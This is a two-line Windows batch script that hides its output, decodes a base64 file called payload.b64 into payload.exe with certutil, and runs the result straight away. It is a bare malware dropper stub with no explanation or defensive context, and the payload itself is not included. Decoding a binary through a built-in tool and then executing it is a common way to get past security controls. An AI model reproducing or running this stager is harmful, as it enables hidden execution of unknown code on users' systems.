@echo off
certutil -decode payload.b64 payload.exe & payload.exe
